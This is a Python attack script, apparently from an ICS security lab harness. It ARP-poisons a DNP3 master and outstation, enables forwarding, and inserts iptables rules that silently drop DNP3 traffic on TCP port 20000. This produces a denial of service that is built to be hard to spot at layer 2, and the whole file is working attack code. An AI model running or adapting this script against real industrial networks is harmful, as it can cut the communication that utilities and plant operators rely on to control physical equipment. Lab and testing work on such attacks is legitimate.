"""MITM_DOS — ARP-poison master+outstation, then black-hole DNP3 traffic.

Combines ARP poisoning with selective drop of TCP/20000 between the two
victims, producing a DoS while ARP cache is corrupted. Other traffic is
forwarded so the link doesn't look obviously dead at L2.

Requires: iptables, scapy. IP forwarding ON.
"""
import argparse, os, signal, subprocess, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from scapy.all import ARP, Ether, send, srp, conf
from dnp3 import now
from config import OUTSTATION_IP, OUTSTATION_PORT, MASTER_IP, ATTACKER_IFACE

def sh(cmd): subprocess.run(cmd, shell=True, check=False)

def mac_of(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, iface=iface, verbose=False)
    for _, r in ans: return r.hwsrc
    raise RuntimeError(f"no ARP reply from {ip}")

def poison(target_ip, target_mac, spoof_ip, iface):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
         iface=iface, verbose=False)

def restore(ip_a, mac_a, ip_b, mac_b, iface):
    for _ in range(5):
        send(ARP(op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b, hwsrc=mac_b),
             iface=iface, verbose=False)
        send(ARP(op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a, hwsrc=mac_a),
             iface=iface, verbose=False)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default=ATTACKER_IFACE)
    p.add_argument("--master", default=MASTER_IP)
    p.add_argument("--outstation", default=OUTSTATION_IP)
    p.add_argument("--port", type=int, default=OUTSTATION_PORT)
    p.add_argument("--duration", type=int, default=120)
    p.add_argument("--interval", type=float, default=2.0)
    a = p.parse_args()
    conf.iface = a.iface

    m_mac = mac_of(a.master, a.iface)
    o_mac = mac_of(a.outstation, a.iface)

    sh("sysctl -w net.ipv4.ip_forward=1")
    sh(f"iptables -I FORWARD -p tcp --dport {a.port} -j DROP")
    sh(f"iptables -I FORWARD -p tcp --sport {a.port} -j DROP")

    print(f"[{now()}] MITM_DOS start")
    end = time.time() + a.duration
    try:
        while time.time() < end:
            poison(a.master,     m_mac, a.outstation, a.iface)
            poison(a.outstation, o_mac, a.master,     a.iface)
            time.sleep(a.interval)
    finally:
        sh(f"iptables -D FORWARD -p tcp --dport {a.port} -j DROP")
        sh(f"iptables -D FORWARD -p tcp --sport {a.port} -j DROP")
        sh("sysctl -w net.ipv4.ip_forward=0")
        restore(a.master, m_mac, a.outstation, o_mac, a.iface)
        print(f"[{now()}] MITM_DOS stop")

if __name__ == "__main__":
    main()
